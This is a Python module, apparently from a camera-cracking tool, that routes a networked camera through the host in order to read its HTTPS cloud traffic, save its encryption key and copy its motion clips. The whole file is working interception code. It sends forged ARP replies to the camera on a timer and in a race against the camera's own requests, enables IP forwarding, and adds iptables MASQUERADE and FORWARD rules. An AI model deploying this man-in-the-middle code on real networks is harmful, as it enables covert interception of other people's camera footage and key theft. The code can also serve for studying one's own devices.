"""Routing the camera through this host: for reading its key, and for
copying its motion clips."""
import atexit
import shutil
import subprocess
import threading
from pathlib import Path

from . import keys, rawnet
from .changes import keep_awake, run, signals_held
from .netutil import camera_iface, default_gateway, ipt


class Reroute:
    """The camera routed through this host (OnPath) with its HTTPS read
    (cloud.CloudTap): the key it sends is saved (keys.save), and with
    events_dir set, so are its motion clips (on_motion hears each file).

    start() sets it up and stop() undoes it, as does a `with` block. Every
    change goes into `journal` (a Changes, or one of its scopes, whose
    owner holds the single-instance lock). Both raise SystemExit with the
    reason when the camera can't be routed."""

    def __init__(self, journal, ip, mac=None, on_path=False, events_dir=None,
                 on_motion=None):
        self.journal, self.ip, self.mac = journal, ip, mac
        self.on_path, self.events_dir = on_path, events_dir
        self.on_motion = on_motion or (lambda p: print(f"[+] motion event: {p}"))
        self.iface = self.gateway = None
        self.tap = self.onpath = None
        self.running = False
        self.error = None          # why a capture in the page didn't start
        self._awake = None
        self._lock = threading.Lock()

    def start(self):
        from .cloud import CloudTap
        with self._lock:
            if self.running:
                return
            atexit.register(self.stop)     # in case teardown is cut short
            try:
                self.iface = camera_iface(self.ip, self.on_path)
                self.mac = self.mac or neighbor_mac(self.ip)
                if not self.mac:
                    raise SystemExit(f"{self.ip} does not answer on "
                                     f"{self.iface}; is the camera on?")
                # bind and check everything before touching the camera's route
                self.tap = CloudTap(self.journal, self.ip,
                                    events_dir=self.events_dir,
                                    on_event=self.on_motion, on_key=self._key)
                self.tap.listen()
                self.onpath = OnPath(self.journal, self.ip, self.iface,
                                     poison=not self.on_path)
                self.gateway = self.onpath.gateway
                self._awake = keep_awake("routing a camera")
                self.onpath.start()
                self.tap.start()
                self.running = True
            except BaseException:
                self._teardown()
                raise

    def _key(self, info):
        if info.get("mac") and keys.mac_key(info["mac"]) != keys.mac_key(self.mac):
            print(f"[!] the ENR came from MAC {info['mac']}, but {self.ip} "
                  f"is {self.mac}")
        keys.save(self.mac, enr=info["enr"], model=info.get("model"),
                  fw=info.get("fw"), hw=info.get("hw"))

    def stop(self):
        with self._lock:
            self._teardown()

    def _teardown(self):
        with signals_held():
            for part in (self.tap, self.onpath):
                if part is None:
                    continue
                try:
                    part.stop() if part is self.tap else part.close()
                except Exception as e:  # noqa: BLE001
                    print(f"[!] teardown step failed: {e!r}")
            self.journal.undo_all()
        if self._awake:
            self._awake()
        self.tap = self.onpath = self._awake = None
        self.running = False
        atexit.unregister(self.stop)

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *exc):
        self.stop()
        return False


class OnPath:
    """Make this host the camera's router: ARP-poison only the camera (we
    become its gateway) and MASQUERADE its traffic out under our address.

    Two-way poisoning (camera AND router) made a home router route spoofed
    camera packets that it had also bridged from Wi-Fi to our port with
    the identical 5-tuple; its fast path then sent them back to us with
    the camera's MAC (TTL -1 per bounce, a 25 us ping-pong) and kept doing
    so after the MITM stopped, black-holing that camera flow until the
    camera changed ports. In router mode the real router only ever routes
    our flows and its ARP table is untouched.

    The camera's existing connections survive the switch: its servers
    follow the new NAT mapping from its next keepalive, no reboot needed.

    poison=False skips the ARP step for hosts that already carry the
    camera's traffic (a gateway, or the netns lab).

    Every change goes through the Changes journal, so a crash is undone by
    `wyzecrack cleanup` or the next run."""

    def __init__(self, changes, cam_ip, iface, poison, gateway=None):
        self.changes = changes
        self.cam_ip, self.iface, self.poison = cam_ip, iface, poison
        self.gateway = gateway
        if poison and not gateway:
            self.gateway = default_gateway(iface)
            if not self.gateway:
                raise SystemExit(f"no default gateway on {iface}: the camera "
                                 f"must share this host's LAN and router")
        self.stop = threading.Event()
        self.threads = []
        self.tokens = []

    def _rule(self, table, chain, *spec, insert=False):
        """Add an iptables rule unless an identical one exists, journaling
        its removal first."""
        if ipt("-t", table, "-C", chain, *spec).returncode == 0:
            return
        self.tokens.append(self.changes.add(
            "ipt", args=["-t", table, "-D", chain, *spec]))
        r = ipt("-t", table, "-I" if insert else "-A", chain,
                *(["1"] if insert else []), *spec)
        if r.returncode:
            raise SystemExit(f"iptables -t {table} {chain} failed: "
                             f"{r.stderr.strip()}")

    def start(self):
        _warn_nft_forward_drop()
        c = self.changes
        # setting ip_forward rewrites every conf/*/forwarding and
        # conf/all/accept_redirects; journal them first so they are put
        # back after ip_forward is
        for p in [*sorted(Path("/proc/sys/net/ipv4/conf").glob("*/forwarding")),
                  Path("/proc/sys/net/ipv4/conf/all/accept_redirects")]:
            self.tokens.append(c.sysctl(p))
        self.tokens.append(c.sysctl("/proc/sys/net/ipv4/ip_forward", 1))
        for dev in ("all", self.iface):
            # forwarding out the interface the packet came in on would
            # send the camera ICMP redirects naming the real gateway
            self.tokens.append(c.sysctl(
                f"/proc/sys/net/ipv4/conf/{dev}/send_redirects", 0))
        self._rule("nat", "POSTROUTING", "-s", self.cam_ip, "-o", self.iface,
                   "-j", "MASQUERADE")
        # firewalls that drop forwarded traffic by default (ufw, Docker,
        # firewalld) would black-hole the camera
        self._rule("filter", "FORWARD", "-s", self.cam_ip, "-j", "ACCEPT",
                   insert=True)
        self._rule("filter", "FORWARD", "-d", self.cam_ip, "-j", "ACCEPT",
                   insert=True)
        if self.poison:
            self._arp_start()
        print(f"[+] on-path: routing {self.cam_ip} through this host "
              f"({self.iface}{', ARP' if self.poison else ''})")

    def _arp_start(self):
        me = rawnet.mac_bytes(rawnet.iface_mac(self.iface))
        cam_mac = rawnet.mac_bytes(self._mac(self.cam_ip))
        gw_mac = rawnet.mac_bytes(self._mac(self.gateway))
        # unicast to the camera only: "the gateway is at our MAC"
        lie = rawnet.arp_reply(me, cam_mac, self.gateway, me,
                               self.cam_ip, cam_mac)
        # the restore carries the real gateway MAC in the ARP payload but
        # our own MAC as the Ethernet source: on Wi-Fi a frame whose source
        # is another station's MAC never makes it onto the air
        truth = rawnet.arp_reply(me, cam_mac, self.gateway, gw_mac,
                                 self.cam_ip, cam_mac)
        self.tokens.append(self.changes.add("arp", iface=self.iface,
                                            frame=truth.hex()))

        def send(frame):
            if self.stop.is_set():
                return
            try:
                with rawnet.open_raw(self.iface) as s:
                    s.send(frame)
            except OSError as e:     # link down across suspend/resume
                print(f"[!] ARP send failed ({e})")

        def tick():
            while not self.stop.is_set():
                send(lie)
                self.stop.wait(1.0)

        def answer():
            # win the race when the camera asks for its gateway
            def cb(p):
                if p.op == 1 and p.spa == self.cam_ip and p.tpa == self.gateway:
                    send(lie)
            while not self.stop.is_set():
                try:
                    rawnet.sniff(self.iface, rawnet.arp_filter(),
                                 rawnet.parse_arp, cb, self.stop.is_set)
                except OSError as e:  # suspend/resume
                    print(f"[!] ARP responder error ({e}); retrying")
                    self.stop.wait(2)

        for fn in (tick, answer):
            t = threading.Thread(target=fn, daemon=True)
            t.start()
            self.threads.append(t)

    def _mac(self, ip):
        mac = neighbor_mac(ip)
        if not mac:
            raise SystemExit(f"cannot resolve the MAC of {ip}: is it up and "
                             f"on {self.iface}'s LAN?")
        return mac

    def close(self):
        """Stop the ARP threads, then undo everything start() did."""
        if self.stop.is_set() or not self.tokens:
            self.stop.set()
            return
        print("[*] restoring the camera's route (ARP, NAT, sysctls)...")
        self.stop.set()
        for t in self.threads:
            t.join(2)
        self.changes.undo(self.tokens)
        self.tokens = []
        print("[+] on-path mode off")


def neighbor_mac(ip):
    """The MAC of an on-link host, pinging it first to fill the neighbor
    table, or None."""
    run(["ping", "-c", "1", "-W", "1", ip])
    out = run(["ip", "neigh", "show", ip]).stdout.split()
    if "lladdr" not in out:
        return None
    return out[out.index("lladdr") + 1].lower()


def _warn_nft_forward_drop():
    """The FORWARD accept rules can't override an nftables chain that drops
    forwarded traffic itself; the camera would lose its connection."""
    if not shutil.which("nft"):
        return
    rules = subprocess.run(["nft", "list", "ruleset"], capture_output=True,
                           text=True).stdout
    if "hook forward" in rules and "policy drop" in rules:
        print("[!] an nftables chain on this host drops forwarded traffic; "
              "the camera may lose its connection while it is routed through "
              "here")
